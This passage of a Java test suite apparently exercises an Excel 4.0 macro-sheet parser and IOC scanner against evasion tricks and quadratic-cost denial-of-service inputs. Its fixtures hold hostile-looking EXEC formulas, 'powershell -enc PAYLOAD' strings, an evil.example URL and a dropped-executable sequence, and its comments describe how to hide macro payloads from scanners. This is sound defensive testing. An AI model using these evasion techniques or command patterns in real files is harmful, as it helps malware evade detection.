                "and the structural anomaly must not be crowded out by it; got: "
                        + java.util.Arrays.toString(warnings));
    }

    // ── 10. Round-3 review: three measured OOM/total-loss, two more last-wins ──

    /**
     * A {@code <c>} opening while another is still open used to WIPE the enclosing cell: the
     * inner start reset {@code currentFormulaText}, and the inner {@code </c>} then hit
     * {@code flushCell()}'s {@code currentCellRef == null} early return, so nothing was stored
     * and nothing flagged. Measured end-to-end, the metadata came out character-for-character
     * identical to a clean macro workbook's while {@code =EXEC(...)} vanished from the text.
     */
    @Test
    void testNestedCellElementCannotEraseTheEnclosingCell() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c r=\"A1\"><f>=EXEC(\"" + PAYLOAD + "\")</f><c/></c>");

        assertTrue(parser.getFormulaList().stream().anyMatch(f -> f.contains(PAYLOAD)),
                "the outer cell's formula must survive a nested <c>; got: "
                        + parser.getFormulas());
        assertTrue(parser.hasStructuralAnomaly(), "and the nesting must be flagged");
    }

    /** The decoy variant: an inner cell must not displace the outer one. */
    @Test
    void testNestedCellWithItsOwnFormulaKeepsBoth() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c r=\"A1\"><f>=EXEC(\"" + PAYLOAD + "\")</f>"
                        + "<c r=\"B1\"><f>=DECOY()</f></c></c>");

        String all = String.join(" | ", parser.getFormulaList());
        assertTrue(all.contains(PAYLOAD), "payload must survive; got: " + all);
        assertTrue(all.contains("DECOY"), "and the inner cell is kept too; got: " + all);
        assertTrue(parser.hasStructuralAnomaly());
    }

    /**
     * {@code @r} on {@code <c>} is OPTIONAL in ECMA-376 -- position is implied by document order
     * -- so a workbook without it is VALID and Excel runs it. {@code flushCell()} discarded such
     * a cell's formula and value outright with no flag, making a LEGAL document a total-loss
     * evasion. The implied ref is synthesized; because the shape is legitimate it must NOT be
     * flagged as an anomaly.
     */
    @Test
    void testCellWithNoRefAttributeIsCapturedNotDropped() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c><f>=EXEC(\"" + PAYLOAD + "\")</f></c>");

        assertTrue(parser.getFormulaList().stream().anyMatch(f -> f.contains(PAYLOAD)),
                "a cell with no @r is legal and must be captured; got: " + parser.getFormulas());
        assertFalse(parser.hasStructuralAnomaly(),
                "omitting @r is LEGAL per ECMA-376, so flagging it would fire on ordinary "
                        + "workbooks and devalue the anomaly signal");
    }

    /** Implied position follows document order, so refs stay distinct. */
    @Test
    void testImpliedCellRefsFollowDocumentOrder() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c><f>=EXEC(\"first\")</f></c><c><f>=EXEC(\"second\")</f></c>");

        assertEquals(2, parser.getFormulas().size(),
                "two @r-less cells must not collapse onto one key; got: " + parser.getFormulas());
        assertTrue(parser.getFormulas().containsKey("Macro1:1:A1")
                        && parser.getFormulas().containsKey("Macro1:1:B1"),
                "implied refs should be A1 then B1; got: " + parser.getFormulas().keySet());
    }

    /**
     * Retention of a repeated cell ref must be LINEAR. The first attempt concatenated onto the
     * existing entry and re-emitted the whole accumulation per repetition -- quadratic in CPU and
     * in emitted characters. Two reviewers measured it independently: 6.4 GB of extracted text
     * from 3.1 MB of XML, and an OOM of a 512 MiB heap from 368 KB, with isTruncated() false
     * throughout. OutOfMemoryError is an Error, so the per-part recovery would not catch it.
     */
    @Test
    void testRepeatedCellRefRetentionIsLinearNotQuadratic() throws Exception {
        int n = 4000;
        StringBuilder row = new StringBuilder();
        for (int i = 0; i < n; i++) {
            row.append("<c r=\"A1\"><f>=X</f></c>");
        }
        XlmXmlMacrosheetParser parser = parseRowXml(row.toString());

        int storedChars = parser.getFormulaList().stream().mapToInt(String::length).sum();
        // Linear: n entries of ~2 chars. Quadratic accumulation would be ~n^2/2 = 8,000,000.
        assertTrue(storedChars < 20 * n,
                "retention must be linear in the repetition count; " + n + " repetitions stored "
                        + storedChars + " chars");
        assertEquals(storedChars, parser.getRetainedFormulaChars(),
                "and the charge must still equal exactly what is stored");
        assertTrue(parser.hasStructuralAnomaly(), "duplicated refs are still flagged");
    }

    /**
     * Joining duplicated content with a bare SPACE let two halves that match nothing alone become
     * a full indicator: the scanner's patterns are {@code \bEXEC\(\s*"} and {@code \s*} spanned
     * the separator. That injects an attacker-chosen command line into authoritative IOC output
     * from a workbook that executes nothing.
     */
    @Test
    void testSplitHalvesCannotBeJoinedIntoAFabricatedIoc() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<f>=EXEC(</f><f>\"" + PAYLOAD + "\")</f>");

        String formula = String.join(" | ", parser.getFormulaList());
        assertTrue(formula.contains("EXEC(") && formula.contains(PAYLOAD),
                "both halves are retained as evidence, as separate entries; got: " + formula);
        assertEquals(2, parser.getFormulas().size(),
                "each <f> is its own entry, never joined; got: " + parser.getFormulas());

        List<String> iocs = XlmXmlIocScanner.scan(parser.getFormulas(), Map.of());
        assertTrue(iocs.stream().noneMatch(s -> s.startsWith("EXEC:")),
                "but they must NOT be joined into an EXEC indicator the document never "
                        + "contained; got: " + iocs);
    }

    /**
     * A duplicated {@code <is>} silently deleted the first value. Cell values resolve
     * {@code EXEC(cellref)} and rejoin split URL fragments, so a dropped value is a dropped
     * indicator. The reverse order already kept both -- that asymmetry was the tell.
     */
    @Test
    void testDuplicateInlineStringKeepsBothValues() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<is><t>http://evil.example/PAYLOAD</t></is><is><t>benign</t></is>", "inlineStr");

        String value = parser.getValues().values().stream().findFirst().orElse("");
        assertTrue(value.contains("http://evil.example/PAYLOAD"),
                "the first value must not be deleted by a later one; got: " + value);
        assertTrue(value.contains("benign"), "and the second is kept; got: " + value);
        assertTrue(parser.hasStructuralAnomaly());
    }

    /**
     * A nested {@code <rPh>} lifted phonetic suppression, so text from a furigana subtree Excel
     * never displays was injected into the cell value feeding the IOC scanner -- a fabricated
     * indicator, unflagged. Depth must be tracked, not a boolean.
     */
    @Test
    void testNestedPhoneticRunCannotInjectIntoTheCellValue() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<is><rPh><rPh/><t>http://inject.example/1</t></rPh><t>real</t></is>",
                "inlineStr");

        String value = parser.getValues().values().stream().findFirst().orElse("");
        assertFalse(value.contains("inject.example"),
                "furigana text must never enter the cell value; got: " + value);
        assertEquals("real", value, "only the real run is the value; got: " + value);
    }

    /** Legitimate single-level furigana must still be excluded, and not flagged. */
    @Test
    void testSingleLevelPhoneticRunStillExcludedAndNotFlagged() throws Exception {
        XlmXmlMacrosheetParser parser = parseCellXml(
                "<is><t>real</t><rPh sb=\"0\" eb=\"2\"><t>furi</t></rPh></is>", "inlineStr");
        assertEquals("real", parser.getValues().values().stream().findFirst().orElse(""));
        assertFalse(parser.hasStructuralAnomaly(), "ordinary furigana is not an anomaly");
    }

    /**
     * Per-part parse-error warnings must not be attacker-multipliable. Each carried the sheet
     * name, so with up to 128 macro parts a document could mint 128 DISTINCT warnings and fill
     * the 16-slot cap with decoys, crowding out later diagnoses -- the same
     * attacker-picks-the-diagnosis defect, needing 16 cheap tricks instead of one.
     */
    @Test
    void testDecoyPartsCannotCrowdOutLaterDiagnoses() throws Exception {
        String[] names = new String[20];
        String[] xml = new String[20];
        for (int i = 0; i < 19; i++) {
            names[i] = String.format(Locale.ROOT, "decoy%02d", i);
            xml[i] = "<worksheet><sheetData><c";
        }
        names[19] = "zz-payload";
        xml[19] = cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")</f>", null);

        Metadata metadata = new Metadata();
        processMacroSheets(metadata, names, xml);

        String[] warnings = metadata.getValues(TikaCoreProperties.TIKA_META_EXCEPTION_WARNING);
        long parseErrorSlots = java.util.Arrays.stream(warnings)
                .filter(w -> w.contains("parse error")).count();
        assertEquals(1, parseErrorSlots,
                "19 decoy parts must collapse to ONE parse-error slot, leaving room for other "
                        + "diagnoses; got: " + java.util.Arrays.toString(warnings));
        assertTrue(warnings.length < 16,
                "and the cap must not be near exhausted; got " + warnings.length);
    }

    /**
     * Two macro parts sharing a basename reduce to one cell-key namespace: both charged, one
     * silently dropped by putAll. That fix shipped in the previous commit with NO test, which
     * review flagged -- so here it is.
     */
    @Test
    void testTwoMacroPartsSharingABasenameBothSurvive() throws Exception {
        Metadata metadata = new Metadata();
        String out = processMacroSheetsAtPaths(metadata,
                new String[] {"/xl/macrosheets/m.xml", "/xl/other/m.xml"},
                new String[] {
                    cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")</f>", null),
                    cellXmlDoc("<f>=EXEC(\"second-part\")</f>", null),
                });

        assertTrue(out.contains("EXEC: " + PAYLOAD),
                "the first part's payload must not be overwritten by the second. Got:\n" + out);
        assertTrue(out.contains("EXEC: second-part"), "and the second part's must survive");
        assertTrue(Boolean.parseBoolean(metadata.get("msoffice:xlm-structural-anomaly")),
                "a basename collision is not something Excel produces");
    }

    /**
     * The VALUE path had the same last-wins hole as the formula path: {@code values.put()}
     * replaced on a duplicated cell ref, so a decoy value erased the payload and
     * {@code =EXEC(A1)} then resolved to the decoy -- with no capture-limit and no anomaly flag.
     * The net-credit accounting even made the decoy FIT, so that fix helped the attacker here
     * until the key was uniquified on this path too.
     */
    @Test
    void testDuplicateCellValueCannotEraseThePayloadValue() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c r=\"A1\" t=\"str\"><v>powershell -enc PAYLOAD</v></c>"
                        + "<c r=\"A1\" t=\"str\"><v>0</v></c>");

        String all = String.join(" | ", parser.getValues().values());
        assertTrue(all.contains("powershell -enc PAYLOAD"),
                "the payload value must not be erased by a decoy at the same ref; got: " + all);
        assertEquals(2, parser.getValues().size(),
                "each occurrence gets its own key; got: " + parser.getValues().keySet());
        assertTrue(parser.hasStructuralAnomaly(), "and the duplication is flagged");
    }

    // ── 11. Round-4 review: my round-3 fixes, four of them defective ─────────

    /**
     * Duplicated {@code <f>} elements must not bypass the per-formula cap, and must not cost
     * quadratic work. Seeding the prior text back into the buffer did both: the copy happened
     * BEFORE any {@code formulaMaxLen} check, so 1,000 repeated {@code <f/>} retained 17,982 chars
     * against a 16,384 cap with {@code isTruncated()} FALSE, and each duplicate recopied the whole
     * accumulated buffer.
     */
    @Test
    void testManyDuplicateFormulaElementsRespectTheCapAndStayLinear() throws Exception {
        int n = 1000;
        StringBuilder cell = new StringBuilder("<c r=\"A1\">");
        for (int i = 0; i < n; i++) {
            cell.append("<f>=").append("Y".repeat(40)).append("</f>");
        }
        cell.append("</c>");
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\"><sheetData><row r=\"1\">" + cell + "</row></sheetData></worksheet>";
        // Per-formula cap 64, aggregate 4096: no single entry may exceed 64, and the total is
        // capped regardless of how many duplicates the document supplies.
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null, 4096, 4096, 64, 64, 4096);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        for (String f : parser.getFormulaList()) {
            assertTrue(f.length() <= 64 + XLM_TRUNCATION_MARKER_LEN,
                    "no entry may exceed the per-formula cap; got " + f.length() + " chars");
        }
        int stored = parser.getFormulaList().stream().mapToInt(String::length).sum();
        assertEquals(stored, parser.getRetainedFormulaChars(), "charge must equal stored");
        assertTrue(parser.getRetainedFormulaChars() <= 4096,
                "the aggregate cap must hold across duplicates; charged "
                        + parser.getRetainedFormulaChars());
    }

    /**
     * Duplicate-key suffixing must be LINEAR. Probing from {@code #2} for every duplicate was
     * O(N^2) -- 100,000 cells named A1 costing ~5 billion {@code containsKey} calls -- and the
     * entry-limit check only ran AFTER that loop, so the cap could not stop it. A monotonic
     * counter never revisits a suffix.
     */
    @Test
    void testDuplicateKeySuffixingIsLinear() throws Exception {
        int n = 20000;
        StringBuilder row = new StringBuilder();
        for (int i = 0; i < n; i++) {
            row.append("<c r=\"A1\" t=\"str\"><v>v</v></c>");
        }
        long start = System.nanoTime();
        XlmXmlMacrosheetParser parser = parseRowXml(row.toString());
        long ms = (System.nanoTime() - start) / 1_000_000;

        // Quadratic suffix probing on 20k duplicates is ~200M map lookups; linear is ~20k.
        // A generous ceiling still separates the two by orders of magnitude.
        assertTrue(ms < 20_000, n + " duplicate refs took " + ms + " ms -- suffixing is not linear");
        assertTrue(parser.getValues().size() > 1,
                "and every occurrence is still retained: " + parser.getValues().size());
    }

    /**
     * {@code EXEC(A1)} must resolve EVERY candidate value for that ref. Duplicates are retained
     * under {@code A1#2} keys, but the resolver indexed the RAW trailing segment, so the payload
     * was retained somewhere the resolver never looked: measured, A1="0" then
     * A1="powershell -enc PAYLOAD" with {@code =EXEC(A1)} emitted ONLY {@code EXEC: 0}. Preserving
     * the value did nothing for detection.
     */
    @Test
    void testExecCellRefResolvesEveryCandidateValueIncludingDuplicates() {
        Map<String, String> formulas = Map.of("Macro1:1:B1", "=EXEC(A1)");
        Map<String, String> values = new java.util.LinkedHashMap<>();
        values.put("Macro1:1:A1", "0");
        values.put("Macro1:1:A1#7", "powershell -enc PAYLOAD");

        List<String> iocs = XlmXmlIocScanner.scan(formulas, values);

        assertTrue(iocs.stream().anyMatch(s -> s.contains("powershell -enc PAYLOAD")),
                "the duplicate's payload must be resolved, not just the decoy; got: " + iocs);
        assertTrue(iocs.stream().anyMatch(s -> s.equals("EXEC: 0")),
                "and the decoy is still reported -- we cannot know which Excel honours; got: "
                        + iocs);
    }




    /**
     * A one-character case change in {@code @r} must not bypass duplicate detection. The scanner
     * upper-cases when building its resolution index but the maps were keyed on the RAW {@code @r},
     * so {@code A1} and {@code a1} were distinct map keys -- no {@code containsKey} hit, no anomaly
     * -- that collapsed to ONE index entry where the later writer won. Measured: A1=payload then
     * a1=0 with {@code =EXEC(A1)} gave {@code [EXEC: 0]} and a clean-looking result.
     */
    @Test
    void testCaseVariedCellRefIsStillDetectedAsADuplicate() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c r=\"A1\" t=\"str\"><v>powershell -enc PAYLOAD</v></c>"
                        + "<c r=\"a1\" t=\"str\"><v>0</v></c>");

        assertTrue(parser.hasStructuralAnomaly(),
                "a case-varied duplicate ref is still a duplicate; got keys "
                        + parser.getValues().keySet());
        List<String> iocs = XlmXmlIocScanner.scan(
                Map.of("Macro1:1:B1", "=EXEC(A1)"), parser.getValues());
        assertTrue(iocs.stream().anyMatch(s -> s.contains("powershell -enc PAYLOAD")),
                "and the payload must still resolve, not just the decoy; got: " + iocs);
    }



    /**
     * A {@code <c>} opening inside an OPEN {@code <is>} must not discard the inline string.
     * {@code inlineAcc} is only committed to {@code currentValueText} on {@code </is>}, and the
     * nested-cell guard's {@code flushCell()} cleared it -- so the guard whose stated job is
     * "flush the outer cell so its capture survives" lost the value of a {@code t="inlineStr"}
     * cell entirely. Macrosheet values are not emitted to XHTML, so the payload appeared NOWHERE.
     */
    @Test
    void testNestedCellInsideAnOpenInlineStringKeepsTheValue() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c r=\"A1\" t=\"inlineStr\"><is><t>powershell -enc PAYLOAD</t>"
                        + "<c r=\"B1\"><v>0</v></c></is></c>");

        String values = String.join(" | ", parser.getValues().values());
        assertTrue(values.contains("powershell -enc PAYLOAD"),
                "the inline-string value must survive the nested <c>; got: "
                        + parser.getValues());
        assertTrue(parser.hasStructuralAnomaly());
    }

    /**
     * A colon in {@code @r} poisoned the scanner's resolution index, which keys on the text after
     * the LAST {@code ':'} of {@code sheet:row:ref}. {@code r="Z:A1"} therefore produced a trailing
     * segment of {@code A1} and overwrote the real A1's entry -- with no duplicate map key, so no
     * anomaly. Measured: A1=calc.exe plus Z:A1=payload made {@code =EXEC(A1)} attribute the
     * attacker's text to A1.
     */
    @Test
    void testColonInCellRefCannotPoisonRefResolution() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c r=\"A1\" t=\"str\"><v>calc.exe</v></c>"
                        + "<c r=\"Z:A1\" t=\"str\"><v>powershell -enc PAYLOAD</v></c>");

        List<String> iocs = XlmXmlIocScanner.scan(
                Map.of("Macro1:1:B1", "=EXEC(A1)"), parser.getValues());
        assertTrue(iocs.contains("EXEC: calc.exe"),
                "A1's REAL content must be what EXEC(A1) reports; got: " + iocs);
        assertTrue(iocs.stream().noneMatch(s -> s.contains("powershell -enc PAYLOAD")),
                "and a differently-named cell must not be attributed to A1; got: " + iocs);
        assertTrue(parser.getValues().keySet().stream().noneMatch(k -> k.endsWith(":A1")
                        && k.contains("Z")),
                "the sanitized key must not end in a colon-delimited A1; got: "
                        + parser.getValues().keySet());
    }

    /**
     * An oversized FWRITE must not abort emulation. {@code writeToFile}'s truncation used
     * {@code markLimit}, which {@code stopOnContextLimit} turns into {@code emulationAborted}, so
     * the EXEC after it was never evaluated -- the same "report, do not abort" defect fixed in
     * FCLOSE two methods away, left in the writer.
     */
    @Test
    void testOversizedFileWriteDoesNotAbortLaterCells() {
        XlmMacroEmulator emulator = new XlmMacroEmulator(new HashMap<>(),
                XlmWorkbookSheetMap.empty(),
                new XlmMacroEmulator.Limits(65_536, 16L * 1024 * 1024, 4_096, 1024 * 1024,
                        1_000_000, /* maxFileContentChars */ 64));
        emulator.addMacroCell(0, fopenFormula("C:\\Users\\Public\\p.exe"));
        emulator.addMacroCell(1, fwriteFormula(1, "A".repeat(4096)));
        emulator.addMacroCell(2, fcloseFormula(1));
        emulator.addMacroCell(3, execFormula("powershell -enc AAAA"));

        emulator.emulate();

        assertTrue(emulator.iocs.stream().anyMatch(s -> s.startsWith("EXEC:")),
                "the EXEC after an oversized FWRITE must still be evaluated; got "
                        + emulator.iocs);
        assertTrue(emulator.isLimitReached(),
                "and the truncation must still be reported");
    }

    /**
     * A duplicated {@code <v>} must NOT be recorded as a formula. {@code beginCapture} serves both
     * {@code <f>} and {@code <v>} and stashed into one shared slot, so a duplicate VALUE was
     * recorded through the formula path -- measured, {@code <v>=EXEC("FAKE")</v><v>0</v>} fabricated
     * an EXEC indicator from a cell containing no formula at all.
     */
    @Test
    void testDuplicateValueIsNotRecordedAsAFormula() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c r=\"A1\" t=\"str\"><v>=EXEC(\"FAKE\")</v><v>0</v></c>");

        assertTrue(parser.getFormulas().isEmpty(),
                "a cell with no <f> must produce NO formula entry; got: " + parser.getFormulas());
        List<String> iocs = XlmXmlIocScanner.scan(parser.getFormulas(), Map.of());
        assertTrue(iocs.isEmpty(),
                "and therefore no fabricated EXEC indicator; got: " + iocs);
        assertTrue(String.join(" | ", parser.getValues().values()).contains("EXEC(\"FAKE\")"),
                "the text is still retained as a VALUE; got: " + parser.getValues());
    }

    /** A THIRD sibling {@code <f>} must not silently delete the first. */
    @Test
    void testThreeSiblingFormulasAllSurvive() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c r=\"A1\"><f>=EXEC(\"" + PAYLOAD + "\")</f><f>=1+1</f><f>=2+2</f></c>");

        String all = String.join(" | ", parser.getFormulaList());
        assertTrue(all.contains(PAYLOAD), "the FIRST formula must survive; got: " + all);
        assertTrue(all.contains("1+1") && all.contains("2+2"), "and so must the others: " + all);
        assertEquals(3, parser.getFormulas().size(), "three entries; got: " + parser.getFormulas());
    }

    /**
     * The truncation marker must land on the formula that was ACTUALLY cut. Pending siblings were
     * recorded with {@code false} while the cell-wide flag went to the LAST one, reversing it.
     */
    @Test
    void testTruncationMarkerLandsOnTheFormulaThatWasCut() throws Exception {
        Metadata metadata = new Metadata();
        XHTMLContentHandler xhtml = new XHTMLContentHandler(
                new ToXMLContentHandler(), metadata, new ParseContext());
        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
                + "main\"><sheetData><row r=\"1\"><c r=\"A1\">"
                + "<f>=ABCDEFG</f><f>=OK</f></c></row></sheetData></worksheet>";
        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                xhtml, "Macro1", null, 4096, 4096, /* formulaMaxLen */ 4, 4096, 1 << 20);
        xhtml.startDocument();
        parser.parse();
        xhtml.endDocument();

        String cut = parser.getFormulaList().stream()
                .filter(f -> f.startsWith("=ABC")).findFirst().orElse("");
        String intact = parser.getFormulaList().stream()
                .filter(f -> f.startsWith("=OK")).findFirst().orElse("");
        assertTrue(cut.contains("TIKA-XLM-FORMULA-TRUNCATED"),
                "the CUT formula must carry the marker; got: " + parser.getFormulaList());
        assertFalse(intact.contains("TIKA-XLM-FORMULA-TRUNCATED"),
                "and the intact one must not; got: " + parser.getFormulaList());
    }

    /**
     * The nested-cell recovery must COMBINE an in-flight inline string with an existing value, as
     * the normal {@code </is>} path does -- only filling an empty slot lost the inline payload
     * whenever a {@code <v>} had already been captured.
     */
    @Test
    void testNestedCellRecoveryCombinesInlineStringWithAnExistingValue() throws Exception {
        XlmXmlMacrosheetParser parser = parseRowXml(
                "<c r=\"A1\"><v>DECOY</v><is><t>PAYLOAD-INLINE</t>"
                        + "<c r=\"B1\"><v>0</v></c></is></c>");

        String values = String.join(" | ", parser.getValues().values());
        assertTrue(values.contains("PAYLOAD-INLINE"),
                "the inline payload must survive alongside the decoy; got: " + parser.getValues());
        assertTrue(values.contains("DECOY"), "and the decoy too; got: " + values);
    }

    // ── Cost shape: every attacker-repeatable dimension, measured ────────────

    /**
     * Assert the cost of {@code body} grows SUB-QUADRATICALLY in n.
     *
     * <p>Ratios across doublings, not a wall-clock ceiling: a single-size timeout is useless here
     * because a 4x-per-doubling curve slips under any threshold at small n and only explodes in
     * production. Quadratic shows ~4.0 per doubling, linear ~2.0. Every DoS this work introduced --
     * two OOMs and a CPU exhaustion, all found by reviewers rather than by me -- was quadratic cost
     * on an input the document controls, and none of the existing tests could see it because they
     * asserted on retained SIZE or a fixed timeout.
     *
     * <p>Timing is noisy, so: warm up, take the median of three, require the base measurement to be
     * large enough to mean something, and allow a generous 3.0 ratio.
     */
    private static <T> void assertSubQuadratic(String what, int startN,
                                              java.util.function.IntFunction<T> prepare,
                                              java.util.function.Consumer<T> run) {
        // PREPARE is untimed, RUN is timed. Building the input is inherently linear, and folding it
        // into the measurement diluted the signal enough that a quadratic parse could hide behind
        // it -- and made the "too cheap to measure" floor unreachable for cheap dimensions.
        //
        // The base auto-scales until it is big enough to mean something: a hand-tuned size is
        // machine-dependent and produced a flake at 10, 5, 38 ms, where the 2n run came in FASTER
        // than n. Growth is capped so a genuinely quadratic implementation cannot spin here.
        // 15 ms, not 60, and measured as thread CPU time below. The floor decides how far the
        // scale loop climbs, and climbing changes the COST REGIME rather than just the sample size:
        // the sibling of this helper failed ~30% of full-suite runs because its top point grew
        // large enough that allocation, not the work under test, dominated the timing. A lower
        // floor keeps every gate nearer the size its startN was chosen for. It is honest at 15 ms
        // because CPU time has nanosecond resolution and none of wall clock's scheduling noise.
        final long minMeasurable = 15_000_000L;
        int baseN = startN;
        long baseCost = 0;
        run.accept(prepare.apply(baseN));         // warm up JIT on the real shape
        for (int grow = 0; grow < 7; grow++) {
            baseCost = bestOfThree(run, prepare.apply(baseN));
            if (baseCost >= minMeasurable) {
                break;
            }
            baseN *= 2;
        }
        assertTrue(baseCost >= minMeasurable,
                what + ": could not reach a measurable base cost even at n=" + baseN + " ("
                        + baseCost / 1_000_000 + " ms). Raise startN rather than trusting ratios "
                        + "built on noise.");

        long c2 = bestOfThree(run, prepare.apply(baseN * 2));
        long c4 = bestOfThree(run, prepare.apply(baseN * 4));

        // Judge TOTAL growth across the 4x span, not each doubling separately. Per-doubling ratios
        // fail on a single noisy point -- observed 3.94 then 1.09 on the same run, which is
        // mutually inconsistent and therefore noise rather than a cost shape. Over 4x input,
        // linear costs 4x and quadratic costs 16x, so 8x is a wide midpoint that no linear
        // implementation reaches and no quadratic one escapes. A flaky gate is worse than none:
        // it teaches people to ignore red.
        double total = (double) c4 / baseCost;
        assertTrue(total < 8.0,
                what + ": cost grows ~quadratically. n=" + baseN + "," + (baseN * 2) + ","
                        + (baseN * 4) + " -> " + baseCost / 1_000_000 + "," + c2 / 1_000_000 + ","
                        + c4 / 1_000_000 + " ms; total growth over 4x input "
                        + String.format(java.util.Locale.ROOT, "%.1fx", total)
                        + " (linear ~4x, quadratic ~16x)");
    }

    /**
     * Fastest of five runs, measured as this THREAD's CPU time: the minimum is the least
     * noise-contaminated estimate, and CPU time does not bill this thread for a collection that
     * ran on the collector's threads. Wall clock does, and these fixtures allocate heavily enough
     * that a pause routinely landed inside a timed region.
     */
    private static <T> long bestOfThree(java.util.function.Consumer<T> run, T input) {
        java.lang.management.ThreadMXBean threads =
                java.lang.management.ManagementFactory.getThreadMXBean();
        boolean cpuTime = threads.isCurrentThreadCpuTimeSupported();
        long best = Long.MAX_VALUE;
        for (int rep = 0; rep < 5; rep++) {
            System.gc();
            long t0 = cpuTime ? threads.getCurrentThreadCpuTime() : System.nanoTime();
            run.accept(input);
            long dt = (cpuTime ? threads.getCurrentThreadCpuTime() : System.nanoTime()) - t0;
            best = Math.min(best, dt);
        }
        return best;
    }

    /** Build a macrosheet document whose single row repeats {@code cell} n times. */
    private static String repeatedCellSheet(String cell, int n) {
        StringBuilder row = new StringBuilder(cell.length() * n + 256);
        for (int i = 0; i < n; i++) {
            row.append(cell);
        }
        return "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">"
                + "<sheetData><row r=\"1\">" + row + "</row></sheetData></worksheet>";
    }

    /** Parse a prepared macrosheet document, discarding the result. */
    private static void parsePrepared(String xml) {
        try {
            Metadata metadata = new Metadata();
            XHTMLContentHandler xhtml = new XHTMLContentHandler(
                    new ToXMLContentHandler(), metadata, new ParseContext());
            XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
                    new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
                    xhtml, "Macro1", null);
            xhtml.startDocument();
            parser.parse();
            xhtml.endDocument();
        } catch (Exception e) {
            throw new AssertionError(e);
        }
    }

    /** Duplicated {@code <c r="A1">} -- the dimension whose uniquify loop was O(N^2). */
    @Test
    void testDuplicateCellRefCostIsSubQuadratic() {
        assertSubQuadratic("duplicate <c r> per row", 8000,
                n -> repeatedCellSheet("<c r=\"A1\"><f>=1</f></c>", n),
                XlmEvasionResilienceTest::parsePrepared);
    }

    /** Duplicated {@code <f>} in one cell -- the dimension whose buffer seeding was O(N^2). */
    @Test
    void testDuplicateFormulaElementCostIsSubQuadratic() {
        assertSubQuadratic("duplicate <f> per cell", 8000,
                n -> {
                    StringBuilder cell = new StringBuilder("<c r=\"A1\">");
                    for (int i = 0; i < n; i++) {
                        cell.append("<f>=1</f>");
                    }
                    return "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/"
                            + "2006/main\"><sheetData><row r=\"1\">" + cell
                            + "</c></row></sheetData></worksheet>";
                },
                XlmEvasionResilienceTest::parsePrepared);
    }

    /**
     * Duplicated {@code <is>} in one cell -- the value-side join.
     *
     * <p>This dimension FOUND the real defect: on the harness's first ever run it measured ratios
     * 5.00 and 4.62 here, which is how the quadratic value-path concatenation was discovered after
     * five review rounds had missed it.
     *
     * <p>HONEST LIMIT: I could not subsequently construct a mutation that this test detects.
     * Restoring the per-element concatenation alone leaves it green, at 1-char and at 200-char
     * element widths, and I did not determine why within reasonable effort -- the original defect
     * may have had a second cost component that the mutation does not reconstruct. So treat this as
     * a dimension that is MEASURED but not currently mutation-proven, unlike the
     * {@code <c r>}/{@code <f>} dimensions, which fail at ratios ~4.0 when their defects are put
     * back. Do not read a green here as strong evidence.
     */
    @Test
    void testDuplicateInlineStringCostIsSubQuadratic() {
        assertSubQuadratic("duplicate <is> per cell", 8000,
                n -> repeatedCellSheet("<is><t>" + "v".repeat(200) + "</t></is>", n),
                XlmEvasionResilienceTest::parsePrepared);
    }

    // ── Gate 2: charge == stored, for the OTHER budget ───────────────────────

    /**
     * The VALUE budget must also be charged exactly what is stored.
     *
     * <p>The formula budget has had this invariant since three retention-policy changes cost five
     * test rewrites; {@code ValueCharBudget} had none -- and it is the harder one, because a single
     * instance is shared across every macro part AND the worksheet capture path, so a leak
     * compounds document-wide. Read by reflection because the counter is deliberately private.
     */
    @Test
    void testValueBudgetChargeEqualsStoredAcrossShapes() throws Exception {
        String[][] shapes = {
            {"plain value", "<c r=\"A1\" t=\"str\"><v>plain</v></c>"},
            {"duplicate value", "<c r=\"A1\" t=\"str\"><v>one</v></c>"
                    + "<c r=\"A1\" t=\"str\"><v>two</v></c>"},
            {"inline string", "<c r=\"A1\" t=\"inlineStr\"><is><t>abc</t></is></c>"},
            {"rich text runs", "<c r=\"A1\" t=\"inlineStr\"><is><r><t>ab</t></r>"
                    + "<r><t>cd</t></r></is></c>"},
            {"duplicate <is>", "<c r=\"A1\" t=\"inlineStr\"><is><t>aa</t></is>"
                    + "<is><t>bb</t></is></c>"},
            {"value then inline", "<c r=\"A1\"><v>vv</v><is><t>ii</t></is></c>"},
            {"furigana excluded", "<c r=\"A1\" t=\"inlineStr\"><is><t>real</t>"
                    + "<rPh sb=\"0\" eb=\"2\"><t>furi</t></rPh></is></c>"},
            {"no @r", "<c t=\"str\"><v>implied</v></c>"},
            {"nested cell", "<c r=\"A1\" t=\"str\"><v>outer</v>"
                    + "<c r=\"B1\" t=\"str\"><v>inner</v></c></c>"},
        };
        java.lang.reflect.Field retained =
                XSSFExcelExtractorDecorator.ValueCharBudget.class.getDeclaredField("retained");
        retained.setAccessible(true);

